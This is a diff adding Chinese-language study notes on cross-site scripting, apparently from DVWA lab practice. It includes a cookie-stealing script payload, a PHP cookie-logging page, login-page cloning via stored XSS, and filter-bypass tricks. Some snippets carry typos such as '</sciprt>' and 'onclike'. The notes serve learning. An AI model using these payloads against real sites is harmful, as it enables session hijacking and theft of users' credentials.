@@ -1,0 +1,78 @@
+
+xss：
+	在Web页面插入恶意代码，用户浏览该页面时，被触发
+
+
+反射型：
+	一次性
+
+存储型：
+	持久型
+	存储在服务器
+
+DOM 型：
+	
+
+XSS 盗取 cookie：
+	dvwa xss reflected
+		输入：
+			<script>document.location='http://127.0.0.1/xss/cookie.php?cookie='+document.cookie</sciprt>
+		phpstudy：
+			应有xss目录
+			cookie.php：
+				<?php
+					$cookie=$_GET['cookie'];
+					file_put_contents('cookie.txt',$cookie);
+				?>
+
+		利用 cookie 劫持
+
+XSS 篡改网页链接：
+	注入 JS 代码，改变页面里的 link
+
+盗取用户信息：
+	克隆登陆页面，利用存储 XSS 跳转
+	setookit 工具
+
+没有过滤的 XSS：
+	直接注入 JS 代码
+
+属性中的 XSS：
+	注入点输入任意字符后搜索字符所在位置
+	闭合属性，注入 JS代码  或事件
+
+选择列表中的 XSS：
+
+空格属性的 XSS：
+
+绕过 script 和 on 事件：
+	中间添加空格：
+		<a href="javasc     ript:alert('aaa')/>
+
+IE 两个反引号可以闭合一个左边双引号
+	`` onclike=
+
+IE 利用 CSS 触发 XSS：
+	expression 过滤绕过：
+		ex/**/pression
+
+16进制绕过过滤：
+unicode 绕过：
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
